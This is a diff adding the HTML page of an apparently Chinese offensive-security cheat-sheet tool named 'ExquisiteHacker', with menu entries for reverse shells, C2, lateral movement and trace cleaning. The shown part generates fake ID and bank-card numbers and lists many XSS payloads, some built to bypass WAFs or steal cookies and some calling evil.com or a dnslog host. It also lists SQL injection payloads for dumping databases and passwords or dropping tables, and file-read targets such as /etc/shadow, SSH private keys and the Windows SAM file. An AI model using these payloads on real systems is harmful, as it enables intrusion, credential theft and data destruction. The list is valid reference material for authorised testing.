@@ -1,0 +1,2215 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ExquisiteHacker</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <!-- 左侧导航栏 -->
+        <nav class="sidebar">
+            <div class="theme-toggle">
+                <button id="themeToggle" class="theme-toggle-btn">🌙 切换主题</button>
+            </div>
+            <ul>
+                <li><a href="#" id="infoGeneratorLink">信息收集</a></li>
+                <li><a href="#" id="decoderToolLink">解码加密</a></li>
+                <li><a href="#" id="webPenetrationLink">Web渗透</a></li>
+                <li><a href="#" id="reverseShellLink">反弹shell</a></li>
+                <li><a href="#" id="fileDownloadLink">文件下载</a></li>
+                <li><a href="#" id="k8sLink" class="nav-link">K8s</a></li>
+                <li><a href="#" id="c2Link" class="nav-link">C2</a></li>            
+                <li><a href="#" id="systemInfoLink">内网信息收集</a></li>
+                <li><a href="#" id="lateralMovementLink">内网横向移动</a></li>
+                <li><a href="#" id="traceCleanLink">痕迹清理</a></li>
+                <li><a href="#" id="incidentResponseLink">应急响应</a></li>
+            </ul>
+        </nav>
+
+        <!-- 右侧内容区域 -->
+        <main class="content">
+            <!-- 信息生成内容 -->
+            <section id="infoGenerator" class="section">
+                <h2>信息生成器</h2>
+                <div class="infoGeneratorContainer">
+                    <div class="infoGroup">
+                        <h4>随机信息生成</h4>
+                        <div class="randomGenerator">
+                            <button id="generateRandomInfo" class="generateBtn">生成随机信息</button>
+                            <div class="randomResults">
+                                <div class="command-group">
+                                    <h4>👤 姓名</h4>
+                                    <pre><code id="randomName">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>📱 手机号</h4>
+                                    <pre><code id="randomPhone">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>🆔 身份证号</h4>
+                                    <pre><code id="randomIdCard">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>💳 银行卡号</h4>
+                                    <pre><code id="randomBankCard">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>🏠 家庭住址</h4>
+                                    <pre><code id="randomHomeAddress">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>📦 收货地址</h4>
+                                    <pre><code id="randomDeliveryAddress">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>🏢 公司名称</h4>
+                                    <pre><code id="randomCompany">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>🔑 统一社会信用代码</h4>
+                                    <pre><code id="randomCreditCode">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>📚 文化程度</h4>
+                                    <pre><code id="randomEducation">点击生成</code></pre>
+                                </div>
+                                <div class="command-group">
+                                    <h4>🔐 随机密码</h4>
+                                    <pre><code id="randomPassword">点击生成</code></pre>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </section>
+            
+            <!-- 解码加密工具 -->
+            <section id="decoderTool" class="section">
+                <h2>解码加密工具</h2>
+                <div class="decoder-tool">
+                    <div class="decoder-mode">
+                        <label><input type="radio" name="decoderInputMode" value="text" checked> Text</label>
+                        <label><input type="radio" name="decoderInputMode" value="hex"> Hex</label>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="decoderAction">操作:</label>
+                        <select id="decoderAction">
+                            <option value="decode">Decode as ...</option>
+                            <option value="encode">Encode as ...</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="decoderAlgorithm">方式:</label>
+                        <select id="decoderAlgorithm" class="decoder-algorithm-select">
+                            <option value="plain" class="decoder-opt-plain">Plain</option>
+                            <option value="url" class="decoder-opt-url">URL</option>
+                            <option value="html" class="decoder-opt-html">HTML</option>
+                            <option value="base64" class="decoder-opt-base64">Base64</option>
+                            <option value="asciiHex" class="decoder-opt-ascii">ASCII hex</option>
+                            <option value="hex" class="decoder-opt-hex">Hex</option>
+                            <option value="octal" class="decoder-opt-octal">Octal</option>
+                            <option value="binary" class="decoder-opt-binary">Binary</option>
+                            <option value="gzip" class="decoder-opt-gzip">Gzip</option>
+                            <option value="aes" class="decoder-opt-aes">AES</option>
+                            <option value="des" class="decoder-opt-des">DES</option>
+                            <option value="sm2" class="decoder-opt-sm">SM2</option>
+                            <option value="sm3" class="decoder-opt-sm">SM3</option>
+                            <option value="sm4" class="decoder-opt-sm">SM4</option>
+                            <option value="rc4" class="decoder-opt-rc4">RC4</option>
+                            <option value="rsa" class="decoder-opt-rsa">RSA</option>
+                        </select>
+                    </div>
+
+                    <div id="decoderCryptoOptions" class="decoder-crypto-options">
+                        <div class="form-group">
+                            <label for="decoderKey">Key / 私钥 / 公钥:</label>
+                            <textarea id="decoderKey" rows="3" placeholder="AES/DES/SM4/RC4 填 key；RSA/SM2 解密填私钥，RSA 加密填公钥"></textarea>
+                        </div>
+                        <div class="form-group">
+                            <label for="decoderIv">IV / Nonce:</label>
+                            <input type="text" id="decoderIv" placeholder="AES-CBC/SM4-CBC/DES-CBC 可填 IV，留空使用 0 IV">
+                        </div>
+                        <div class="form-group">
+                            <label for="decoderCipherMode">模式:</label>
+                            <select id="decoderCipherMode">
+                                <option value="cbc">CBC</option>
+                                <option value="ecb">ECB</option>
+                                <option value="gcm">GCM(AES)</option>
+                                <option value="oaep">OAEP(RSA)</option>
+                            </select>
+                        </div>
+                        <div class="form-group">
+                            <label for="decoderInputFormat">密文/输出格式:</label>
+                            <select id="decoderInputFormat">
+                                <option value="base64">Base64</option>
+                                <option value="hex">Hex</option>
+                                <option value="text">Text</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="decoderInput">输入:</label>
+                        <textarea id="decoderInput" rows="8" placeholder="在这里输入要解码或加密的内容"></textarea>
+                    </div>
+
+                    <div class="decoder-buttons">
+                        <button id="decoderRunButton" type="button">执行</button>
+                        <button id="decoderSwapButton" type="button">结果转输入</button>
+                        <button id="decoderClearButton" type="button">清空</button>
+                    </div>
+
+                    <pre id="decoderOutput" class="command-output" readonly placeholder="结果将显示在这里..."></pre>
+                    <p class="decoder-note">提示：AES/RSA 使用浏览器原生 WebCrypto；DES/SM2/SM3/SM4/RC4 为本地实现或兼容入口。部分算法需要正确 key、IV、密文格式才能解密。</p>
+                </div>
+            </section>
+            
+            <!-- Web渗透内容 -->
+            <section id="webPenetration" class="section">
+                <h2>Web渗透</h2>
+                <div class="tabHeader">
+                    <button class="tabButton active" data-target="xssTab">XSS</button>
+                    <button class="tabButton" data-target="sqlInjectionTab">SQL注入</button>
+                    <button class="tabButton" data-target="fileReadTab">文件读取</button>
+                </div>
+                
+                <!-- XSS Tab -->
+                <div id="xssTab" class="tabContent active">
+                    <h3>XSS Payload</h3>
+                    <div class="xssPayloads">
+                        <div class="payloadGroup">
+                            <h4>基础XSS</h4>
+                            <pre><code>&lt;script&gt;alert("XSS")&lt;/script&gt;</code></pre>
+                            <pre><code>&lt;a href="java&#115;cript:alert('xss')"&gt;link&lt;/a&gt;</code></pre>
+                            <pre><code>&lt;a href='vbscript:MsgBox("XSS")'&gt;link&lt;/a&gt;</code></pre>
+                            <pre><code>&lt;img src=1 onerror=alert(1)&gt;</code></pre>
+                            <pre><code>&lt;/p&gt;&lt;img src=1 onerror=alert(1)&gt;</code></pre>
+                            <pre><code>&lt;x oncopy=alert(1)&gt;1&lt;/x&gt;</code></pre>
+                            <pre><code>&lt;base href=//evil.com&gt;</code></pre>
+                            <pre><code>&lt;a/href=//0&gt;123&lt;/a &gt;</code></pre>
+                            <pre><code>&lt;img src=x onerror=alert(document.cookie)&gt;</code></pre>
+                            <pre><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></pre>
+                            <pre><code>&lt;a href="javascript:alert(document.cookie)"&gt;link&lt;/a&gt;</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>高级XSS</h4>
+                            <pre><code>&lt;img src="x" onerror="a=`aler`;b=t`;c='(`xss`)&gt;</code></pre>
+                            <pre><code>&lt;img src=http://www.baidu.com x="⋌"  &lt;/:&gt;1&gt;&lt;&lt;/:&gt;button formaction\=alert(1)&lt;"&gt;M&lt;&lt;br&gt;</code></pre>
+                            <pre><code>bypassPoc: &lt;iframe src/="data:text/html;base64,PHNjcmlwdD5hbGVydCgieHNzIik8L3NjcmlwdD4="&gt;&lt;/iframe&gt;</code></pre>
+                            <pre><code>&lt;img src=1 onerror=alert(4&#41; ccccc</code></pre>
+                            <pre><code>&lt;p onpointerenter=$?.get(`//14.rs`,0,0,'script')&gt;1</code></pre>
+                            <pre><code>\"\u003cinput/onfocus=_=confirm,_(123)\u003e</code></pre>
+                            <pre><code>&lt;img src=1 onerror="window.onerror=eval;throw'=alert\x281\x29';"&gt;</code></pre>
+                            <pre><code>&lt;svg/onload=s=createElement('script');body.appendChild(s);s.src='js地址'&gt;</code></pre>
+                            <pre><code>%20&gt;&lt;a%201%3d1&gt;&lt;details%2fopen%2fontoggle%3dtop%5b%27ale%27%2b%27rt%27%5d%281111%29&gt;&lt;</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>编码XSS</h4>
+                            <pre><code>&lt;img src=x onerror = &#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x31&#x31&#x29&gt;</code></pre>
+                            <pre><code>&lt;a href=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&gt;Click&lt;/a&gt;</code></pre>
+                            <pre><code>&lt;svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')&gt;</code></pre>
+                            <pre><code>&lt;iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"&gt;</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>Unicode编码XSS</h4>
+                            <pre><code>&lt;input onfocus=\u0061\u006C\u0065\u0072\u0074(1) autofocus&gt;</code></pre>
+                            <pre><code>&lt;a href=javascript:\u0061\u006C\u0065\u0072\u0074(1)&gt;Click&lt;/a&gt;</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>组合XSS</h4>
+                            <pre><code>&lt;img src=x onerror=alert(1)&gt;</code></pre>
+                            <pre><code>&lt;img src="x" onerror="window['al'+'ert'](1)"&gt;</code></pre>
+                            <pre><code>&lt;svg onload=alert(1)&gt;</code></pre>
+                            <pre><code>&lt;form id='test'&gt;&lt;/form&gt;&lt;button form='test' formaction='javascript:alert(1)'&gt;X&lt;/button&gt;</code></pre>
+                            <pre><code>&lt;a href=javascript:[1].find(alert)&gt;xss&lt;/a&gt;</code></pre>
+                            <pre><code>&lt;iframe src=javascript:[1].find(alert)&gt;&lt;/iframe&gt;</code></pre>
+                            <pre><code>&lt;xmp onmousemove="alert(1)"&gt;test&lt;/xmp&gt;</code></pre>
+                            <pre><code>&lt;form id="test"&gt;&lt;/form&gt;&lt;button form="test" formaction="javascript:prompt(xss)"&gt;X&lt;/button&gt;</code></pre>
+                            <pre><code>&lt;x onmouseover="top['ale'+'rt'].call(null,'xss')"&gt;test</code></pre>
+                            <pre><code>&lt;img src=1 onerror=location="javascr"+"ipt:"+"%61%6C%65%72%74%28%31%29"&gt;</code></pre>
+                            <pre><code>&lt;input/onfocus=_=alert,_(123)&gt;</code></pre>
+                            <pre><code>&lt;input/%00/autofocus=""%00/onfocus=.1|alert`XSS`&gt;</code></pre>
+                            <pre><code>&lt;svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')&gt;</code></pre>
+                            <pre><code>&lt;details open ontoggle=[43804..toString(36)].some(confirm)&gt;</code></pre>
+                            <pre><code>&lt;object data='data:text/html;base64,PFNDUklQVD5hbGVydCgneHNzJyk7PC9TQ1JJUFQ+' /src&gt;</code></pre>
+                            <pre><code>&lt;EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"&gt;&lt;/EMBED&gt;</code></pre>
+                            <pre><code>&lt;table&gt;&lt;caption onclick=aler\u0074(String.fr\u006fmCharC\u006fde(49))&gt;Click me</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>绕WAF</h4>
+                            <pre><code>parent['\a\l\ert'](1)</code></pre>
+                            <pre><code>parent['\a\l\ert']`1`</code></pre>
+                            <pre><code>&lt;svg/onload=parent[/al/.source+/ert/.source](1)&gt;</code></pre>
+                            <pre><code>&lt;svg/onload=parent[/al/.source.concat(/ert/.source)](2)&gt;</code></pre>
+                            <pre><code>&lt;/script&gt;&lt;img src=http://fa9b92f6.log.dnslog.sbs&gt;</code></pre>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- SQL注入 Tab -->
+                <div id="sqlInjectionTab" class="tabContent">
+                    <h3>SQL注入Payload</h3>
+                    <div class="sqlInjectionPayloads">
+                        <div class="payloadGroup">
+                            <h4>基础判断</h4>
+                            <pre><code>'</code></pre>
+                            <pre><code>''</code></pre>
+                            <pre><code>`</code></pre>
+                            <pre><code>``</code></pre>
+                            <pre><code>,</code></pre>
+                            <pre><code>"</code></pre>
+                            <pre><code>""</code></pre>
+                            <pre><code>/</code></pre>
+                            <pre><code>//</code></pre>
+                            <pre><code>\</code></pre>
+                            <pre><code>\\</code></pre>
+                            <pre><code>;</code></pre>
+                            <pre><code>' or "</code></pre>
+                            <pre><code>-- or #</code></pre>
+                            <pre><code>' OR '1</code></pre>
+                            <pre><code>' OR 1 -- -</code></pre>
+                            <pre><code>" OR "" = "</code></pre>
+                            <pre><code>" OR 1 = 1 -- -</code></pre>
+                            <pre><code>' OR '' = '</code></pre>
+                            <pre><code>'='</code></pre>
+                            <pre><code>'LIKE'</code></pre>
+                            <pre><code>'=0--+</code></pre>
+                            <pre><code>OR 1=1</code></pre>
+                            <pre><code>' OR 'x'='x</code></pre>
+                            <pre><code>' AND id IS NULL; --</code></pre>
+                            <pre><code>'''''''''''''UNION SELECT '2</code></pre>
+                            <pre><code>%00</code></pre>
+                            <pre><code>/*…*/</code></pre>
+                            <pre><code>+    addition, concatenate (or space in url)</code></pre>
+                            <pre><code>||    (double pipe) concatenate</code></pre>
+                            <pre><code>%    wildcard attribute indicator</code></pre>
+                            <pre><code>@variable  local variable</code></pre>
+                            <pre><code>@@variable  global variable</code></pre>
+                            <pre><code># Numeric</code></pre>
+                            <pre><code>AND 1</code></pre>
+                            <pre><code>AND 0</code></pre>
+                            <pre><code>AND true</code></pre>
+                            <pre><code>AND false</code></pre>
+                            <pre><code>1-false</code></pre>
+                            <pre><code>1-true</code></pre>
+                            <pre><code>1*56</code></pre>
+                            <pre><code>-2</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>联合注入Payload</h4>
+                            <pre><code>#查字段
+1' order by 1#
+1' order by 100#
+#联合查询(假设字段为3)
+-1' union select 1,2,3# //-1使页面报错，方便显示
+#查所有数据库名(假设回显为2)
+-1' union select 1,database(),3#
+-1' union select 1,database(),3 from information_schema.tables#
+#查看版本
+-1' union select 1,version(),3#
+#查指定库的表名
+-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='库名'#
+#查指定表的列名
+-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_schema='库名' and table_name='表名'#
+#查看指定列名的内容
+-1' union select 1,group_concat(列名1,0x3a,列名2),3 from 库名.列名#</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>报错注入Payload</h4>
+                            <pre><code>#extractvalue() //空格和"="被过滤的情况
+1'^extractvalue(1,concat(0x5c,(select(database()))))# //爆库名
+1'^extractvalue(1,concat(0x5c,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like('库名'))))# //查表名
+1'^extractvalue(1,concat(0x5c,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('表名'))))# //查列名
+1'^extractvalue(1,concat(0x7e,(select(left(列名,30))from(库名.表名))))# //查从左数30个字段
+1'^extractvalue(1,concat(0x7e,(select(right(列名,30))from(库名.表名))))#</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>updatexml函数</h4>
+                            <pre><code>#updatexml()函数
+1' and updatexml(1,concat(0x7e,(select database()),0x7e),1)# //爆库
+1' and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema='库名' limit 0,1),0x7e),1)# //查表名
+1' and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema='库名' and table_name='表名' limit 0,1),0x7e),1)# //查列名
+1' and updatexml(1,concat(0x7e,(select concat(username,0x3a,password) from users limit 0,1),0x7e),1)# //查数据</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>BigInt数据类型溢出</h4>
+                            <pre><code>#BigInt数据类型溢出--exp()或pow()
+1' and exp(~(select * from (select user())a))# //查看当前库的权限
+1' and exp(~(select * from (select table_name from information_schema.tables where table_schema=database() limit 0,1)a))# //查表名
+1' and exp(~(select * from (select column_name from information_schema.columns where table_name='表名' limit 0,1)a))# //查列名
+1' and exp(~(select * from(select '列名' from '表名' limit 0,1)))# //获取对应信息</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>floor函数</h4>
+                            <pre><code>#floor()函数
+1' and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)#</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>堆叠注入Payload</h4>
+                            <pre><code>常规查询语句
+1';show databases;# //查库名·
+1';show tables;# //查表名
+1';show columns from `表名`;# //查列名,表名用反引号包围
+
+rename改表改列
+1';RENAME TABLE `表1` TO `表2`;RENAME TABLE `表3` TO `表1`;ALTER TABLE `表1` CHANGE `列1` `列2` VARCHAR(100) ;show columns from 表1;# //将表1改名为表2，将表3改名为表1，再将表1的列1改为列2，最后查看表1的列名信息 //适用于查看没有权限的表
+
+handler读取表中数据
+1';HANDLER 表名 OPEN;HANDLER 表名 READ FIRST;HANDLER 表名 CLOSE;# //此方法使用于在查列时select被禁的情况，逻辑为打开指定表名，读取表中第一行数据，关闭表并释放资源。
+
+set转换操作符
+1;set sql_mode=PIPES_AS_CONCAT;select 1 //适用于后端代码采用'||'判断的情况。
+
+sql预处理
+PREPARE hacker from concat('s','elect', ' * from `表名` ');
+EXECUTE hacker;# //绕过特定字符串的过滤
+set@a=hex编码值;prepare hacker from @a;execute hacker;# //结合hex(进制)编码实现绕过</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>盲注Payload</h4>
+                            <pre><code>基于布尔盲注Payload：
+id=1 AND (SELECT COUNT(*) FROM users) > 0
+id=1 AND SUBSTRING((SELECT version()), 1, 1) = '5'
+id=1 AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)) = 97
+id=1 AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='public') > 10
+id=1 AND LENGTH((SELECT database())) = 6
+
+基于时间盲注Payload：
+id=1; IF((SELECT COUNT(*) FROM users) > 0, SLEEP(5), NULL)
+id=1; IF((SELECT ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1))) = 97, BENCHMARK(10000000, MD5('a')), NULL)
+id=1; IF(EXISTS(SELECT * FROM information_schema.tables WHERE table_schema='public' AND table_name='users'), BENCHMARK(5000000, SHA1('a')), NULL)
+id=1; IF((SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users') = 5, SLEEP(2), NULL)
+id=1; IF((SELECT SUM(LENGTH(username)) FROM users) > 20, BENCHMARK(3000000, MD5('a')), NULL)
+
+错误基于盲注Payload：
+id=1 UNION ALL SELECT 1,2,table_name FROM information_schema.tables
+id=1 UNION ALL SELECT 1,2,column_name FROM information_schema.columns WHERE table_name='users'
+id=1 UNION ALL SELECT username,password,3 FROM users
+id=1'; SELECT * FROM users WHERE username='admin' --
+id=1'; DROP TABLE users; --</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>布尔盲注判断</h4>
+                            <pre><code>判断数据库名称长度
+1' and length(database())>20 #
+//判断数据库名称长度是否大于20
+SELECT length('Hello World');  -- 输出 11
+SELECT length(column_name) FROM table_name;  -- 计算表中某一列的长度
+
+获取数据库名称组成
+1' and ascii(substr(database(),1,1))>20 # 
+
+判断表个数
+1' and (select count(table_name) from information_schema.tables where table_schema=database()) <10#
+
+获取表名称长度
+1' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1)) > 10 #
+
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>100 #     
+//第一个字符
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))判断表达式 #     
+//第二个字符
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #     
+//第三个字符
+1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 1,1),2,1))判断表达式 #     
+
+获取列数
+1' and (select count(column_name) from information_schema.columns where table_schema=database() and table_name='表名')判断表达式 # 
+
+获取列名长度
+//判断第一个列名长度
+1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 0,1),1))判断表达式 #
+
+//判断第二个列名长度
+1' and length(substr((select column_name from information_schema.columns where table_name= 'users' limit 1,1),1))判断表达式 #
+
+获取列名字符组成
+//获取 users 表中第一个列名的第一个字符
+1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users'limit0,1),1,1))判断表达式 #
+
+//获取 users 表中第二个列名的第一个字符
+1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 1,1),1,1))判断表达式 #
+
+//获取 users 表中第三个列名的第一个字符
+1'andascii(substr((select column_name from information_schema.columns where table_name = 'users'limit2,1),1,1))判断表达式 #
+
+//获取 users 表中第三个列名的第二个字符
+1' and ascii(substr((select column_name from information_schema.columns where table_name = 'users' limit 2,1),2,1))判断表达式 #
+
+//获取 users 表中第三个列名的第三个字符
+1'andascii(substr((select column_name from information_schema.columns where table_name = 'users'limit2,1),3,1))判断表达式 #
+
+获取字段长度
+//获取列中第一个字段长度
+1' and length(substr((select user from users limit 0,1),1))判断表达式 #
+
+//获取列中第二个字段长度
+1' and length(substr((select user from users limit 1,1),1))判断表达式 #
+
+获取字段
+//获取第一个字段的第一个字符
+1' and ascii(substr((selectuserfromuserslimit0,1),1,1))判断表达式 #
+//获取第一个字段的第二个字符
+1' and ascii(substr((select user from users limit 0,1),2,1))判断表达式 #
+//获取第二个字段的第一个字符
+1'andascii(substr((selectuserfromuserslimit1,1),1,1))判断表达式 #
+//获取第二个字段的第二个字符
+1' and ascii(substr((select user from users limit 1,1),2,1))判断表达式 #</code></pre>
+                        </div>
+                        
+                        <div class="payloadGroup">
+                            <h4>时间盲注判断</h4>
+                            <pre><code>判断数据库名称长度
+1' and if(length(database())=1,sleep(5),1) 
+
+if(expr1,expr2,expr3)函数：
+判断数据库名称组成
+1' and if(ascii(substr(database(),1,1))>90,sleep(5),1)#
+
+判断表个数
+1' and if((select count(table_name) from information_schema.tables where table_schema=database())=2,sleep(5),1) 
+
+获取表名称长度
+1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=9,sleep(5),1) #
+
+获取表名称组成
+1' and (select ascii(substr(table_name, 1, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1) >= 100 and sleep(5)#
+//获得第一个表名称的第二个字符
+1' and (select ascii(substr(table_name, 2, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1)判断表达式 and sleep(5)#
+
+//获得第一个表名称的第三个字符
+1' and (select ascii(substr(table_name, 3, 1)) from information_schema.tables where table_schema = 'dvwa' limit 1)判断表达式 and sleep(5)#
+
+//以此类推
+
+获取列数
+1' and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name= 'guestbook')=3,sleep(5),1) # 
+
+获取列名长度
+1' and if(length(substr((select column_name from information_schema.columns where table_name= 'guestbook' limit 0,1),1))判断表达式,sleep(5),1) #
+
+获取列名字符组成
+获取第一个列名的第一个字符
+1' and if((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook' limit 0,1) = 判断表达式, sleep(5), 1) #
+//获取第一个列名的第二个字符
+1' and if((selectascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = 'guestbook'limit0,1) = 判断表达式, sleep(5), 1) #
+//获取第一个列名的第三个字符
+1' and if((select ascii(substr(column_name, 3, 1)) from information_schema.columns where table_name = 'guestbook' limit 0,1) = 判断表达式, sleep(5), 1) #
+//获取第二个列名的第一个字符
+1'andif((selectascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook'limit1,1) = ASCII_VALUE, sleep(5), 1) #
+//获取第二个列名的第二个字符
+1' and if((select ascii(substr(column_name, 2, 1)) from information_schema.columns where table_name = 'guestbook' limit 1,1) = ASCII_VALUE, sleep(5), 1) #
+//获取第二个列名的第三个字符
+1'andif((selectascii(substr(column_name, 3, 1)) from information_schema.columns where table_name = 'guestbook'limit1,1) = ASCII_VALUE, sleep(5), 1) #
+//获取第三个列名的第一个字符
+1' and if((select ascii(substr(column_name, 1, 1)) from information_schema.columns where table_name = 'guestbook' limit 2,1) = ASCII_VALUE, sleep(5), 1) #
+
+获取字段
+1' and if((select ascii(substring(column_name, 1, 1)) from information_schema.columns where table_name = 'users' limit 0,1)判断表达式, sleep(5), 1) #
+//获取 user 列名的第一个字段的第二个字符
+1' and if((selectascii(substring(column_name, 2, 1)) from information_schema.columns where table_name = 'users'limit0,1)判断表达式, sleep(5), 1) #
+//获取 user 列名的第一个字段的第三个字符
+1' and if((select ascii(substring(column_name, 3, 1)) from information_schema.columns where table_name = 'users' limit 0,1)判断表达式, sleep(5), 1) #
+//获取 user 列名的第二个字段的第一个字符
+1'andif((SELECTASCII(SUBSTRING(column_name, 1, 1)) FROM information_schema.columns WHERE table_name = 'users'LIMIT1, 1)判断表达式, sleep(5), 1) #
+//获取 user 列名的第二个字段的第二个字符
+1' and if((SELECT ASCII(SUBSTRING(column_name, 2, 1)) FROM information_schema.columns WHERE table_name = 'users' LIMIT 1, 1)判断表达式, sleep(5), 1) #
+//获取 user 列名的第二个字段的第三个字符
+1'andif((selectascii(substring(column_name, 3, 1)) from information_schema.columns where table_name = 'users' limit 1,1)判断表达式, sleep(5), 1) #</code></pre>
+                        </div>
+                    </div>
+                </div>
+                
+                <!-- 文件读取 Tab -->
+                <div id="fileReadTab" class="tabContent">
+                    <h3>文件读取</h3>
+                    <div class="fileReadContent">
+                        <div class="osSection">
+                            <h4>Windows</h4>
+                <div class="note">
+                    <p>C:\boot.ini 🎈查看系统版本</p>
+                    <p>C:\Windows\System32\inetsrv\MetaBase.xml 🎈IIS配置文件</p>
+                    <p>C:\Windows\repair\sam 🎈存储系统初次安装的密码</p>
+                    <p>C:\Program Files\mysql\my.ini 🎈Mysql配置</p>
+                    <p>C:\Program Files\mysql\data\mysql\user.MYD 🎈Mysql root</p>
+                    <p>C:\Windows\php.ini 🎈php配置信息</p>
+                    <p>C:\Windows\my.ini 🎈Mysql配置信息</p>
+                    <p>C:\Windows\win.ini 🎈Windows系统的一个基本系统配置文件</p>
+                    <p>c:\windows\system.ini 🎈Windows初始配置信息的重要文件</p>
+                </div>
+                        </div>
+
+                        <div class="osSection">
+                            <h4>Linux</h4>
+                <div class="note">
+                    <p><strong>ssh相关</strong></p>
+                    <p>/root/.ssh/id_rsa</p>
+                    <p>/root/.ssh/id_rsa.pub</p>
+                    <p>/root/.ssh/id_ras.keystore</p>
+                    <p>/root/.ssh/authorized_keys</p>
+                    <p>/root/.ssh/known_hosts 🎈记录每个访问计算机用户的公钥</p>
+                    <p>/etc/ssh/sshd_config</p>
+                    <p>/var/log/secure</p>
+                    <p>/etc/sysconfig/network-scripts/ifcfg-eth0</p>
+                    <p>/etc/sysconfig/network-scripts/ifcfg-eth1</p>
+                    
+                    <p><strong>常规配置文件</strong></p>
+                    <p>/etc/passwd</p>
+                    <p>/etc/shadow</p>
+                    <p>/etc/hosts</p>
+                    <p>/etc/my.cnf 🎈mysql配置文件</p>
+                    <p>/etc/redis.conf 🎈redis配置文件</p>
+                    <p>/var/lib/mlocate/mlocate.db 🎈全文件路径</p>
+                    <p>/var/www/html/index.html 🎈apache默认页面</p>
+                    <p>/etc/httpd/conf/httpd.conf 🎈apache配置文件</p>
+                    <p>/opt/nginx/conf/nginx.conf 🎈nginx 的配置文件</p>
+                    <p>/root/.wget-hsts</p>
+                    <p>/root/.bash_history 🎈用户历史命令记录文件</p>
+                    <p>/root/.mysql_history 🎈mysql历史命令记录文件</p>
+                    <p>/proc/mounts 🎈记录系统挂载设备</p>
+                    <p>/proc/config.gz 🎈内核配置文件</p>
+                    <p>/proc/self/fd/fd[0-9]* (文件标识符)</p>
+                    <p>/proc/sched_debug 🎈 提供 cpu 上正在运行的进程信息，可以获得进程的 pid 号，可以配合后面需要 pid的利用</p>
